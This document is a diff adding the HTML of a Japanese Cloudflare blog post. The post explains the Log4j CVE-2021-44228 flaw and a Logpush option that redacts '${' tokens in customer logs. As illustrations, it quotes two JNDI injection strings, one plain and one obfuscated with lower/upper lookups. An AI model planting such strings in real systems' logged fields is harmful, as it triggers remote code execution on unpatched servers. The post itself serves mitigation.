@@ -1,0 +1,18 @@
+<div class="post-content lh-copy gray1">
+	<p>2021年12月9日、<a href="https://logging.apache.org/log4j/2.x/index.html" target="_blank">Apache Log4j</a>ユーティリティに影響を与えるゼロデイエクスプロイト<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>について世界中に知れ渡りましたCloudflareは直ちに<a href="https://blog.cloudflare.com/ja-jp/cve-2021-44228-log4j-rce-0-day-mitigation-ja-jp/">WAFを更新し</a>、この脆弱性から保護するようにしましたが、お客様にはできるだけ早くシステムを更新することをお勧めします。</p>
+	<p>しかし、多くのCloudflareのお客様がLog4jを使用するソフトウェアを使ってログを消費していることを知っているので、Cloudflare Logs経由で試みられる不正利用未遂も削減しています。この記事の執筆時点で、送信済みのログには毎秒最大1000回の悪用パターンが確認されています。</p>
+	<p>本脆弱性を誘発する可能性のあるトークンを自動的に削除するよう、Logpush ジョブを直ちに更新することができます。この件に関する詳細は、<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options" target="_blank">developer docs</a> または下記をご参照ください。</p>
+	<h3 id="-"><strong>攻撃の仕組み</strong></h3>
+	<p>Log4jの脆弱性の仕組みについては、<a href="https://blog.cloudflare.com/ja-jp/inside-the-log4j2-vulnerability-cve-2021-44228-ja-jp/">こちらのブログ記事</a>をご覧ください。要するに、攻撃者は &nbsp;${jndi:ldap://example.com/a} のようなものを追加することができるわけです。任意の文字列で、Log4jは、このオブジェクトを取得するために、インターネット上で接続を行います。</p>
+	<p>Cloudflare Logsには、User AgentやURLパスなど、公衆インターネット上のエンドユーザーが制御可能な文字列フィールドが多数含まれています。本脆弱性により、悪意のあるユーザーが、これらのフィールドを読み取り、パッチが適用されていない Log4j のインスタンスを使用するシステムにおいて、リモートでコードを実行する可能性があります。</p>
+	<h3 id="--1"><strong>当社のミティゲーションプラン</strong></h3>
+	<p>残念ながら、${jndi:ldapのようなトークンをチェックするだけでは、この脆弱性から保護するには十分ではありません。テンプレート言語の表現力の高さから、難読化された亜種もチェックする必要があるのです。すでに、実働環境の攻撃者が &nbsp;${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} のようなバリエーションを使用していることが確認されています。したがって、トークン${をリダクティングすることが、この脆弱性を防御する最も一般的な方法です。</p>
+	<p>トークン ${は現在、弊社がお客様に送信しているログに、1秒間に最大1,000回出現しています。いくつかの記録を抜き取り検査したところ、その多くがこの脆弱性を悪用しようとする試み<em> ではない</em>こととがわかりました。したがって、このトークンがログに表示されることを期待しているお客様に影響を与えることなく、安全にログを再編集することはできません。</p>
+	<p>今より、お客様は Logpush ジョブを更新して、文字列 &nbsp;${を再編集し、x{に置き換えることができるようになります。</p>
+	<p>これを有効にするには、Logpush のジョブオプション設定を更新して、パラメータ CVE-2021-44228=true を含めることができます。Logpush API を使用したこの方法の詳細な手順については、<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options" target="_blank">弊社開発者向けドキュメント</a>の例をご参照ください。このオプションは現在Cloudflareダッシュボードでは利用できず、APIを利用してのみ変更可能であることに注意してください。</p>
+	<p><a href="https://twitter.com/intent/tweet?in_reply_to=1470704925785169921" target="_blank"><strong>Twitterでつぶやく</strong></a> <a href="https://news.ycombinator.com/item?id=29551847" target="_blank"><strong> Hacker Newsで話し合う</strong></a> <a href="https://reddit.com/r/CloudFlare/comments/rg5erl/sanitizing_cloudflare_logs_to_protect_customers/" target="_blank"><strong> Redditで話し合う</strong></a></p>
+	<p><a href="https://blog.cloudflare.com/tag/logs/">ログ</a> <a href="https://blog.cloudflare.com/tag/vulnerabilities/">脆弱性</a> <a href="https://blog.cloudflare.com/tag/zero-day-threats/">ゼロデイ脅威</a> <a href="https://blog.cloudflare.com/tag/security/">セキュリティ</a> <a href="https://blog.cloudflare.com/tag/log4j/">Log4J</a></p>
+	<p>Twitterでフォロー</p>
+	<p>Jon Levine | <a href="https://twitter.com/@jplevine" target="_blank">@jplevine</a></p>
+	<p>Cloudflare | <a href="https://twitter.com/Cloudflare" target="_blank">Cloudflare</a><br></p>
+</div>
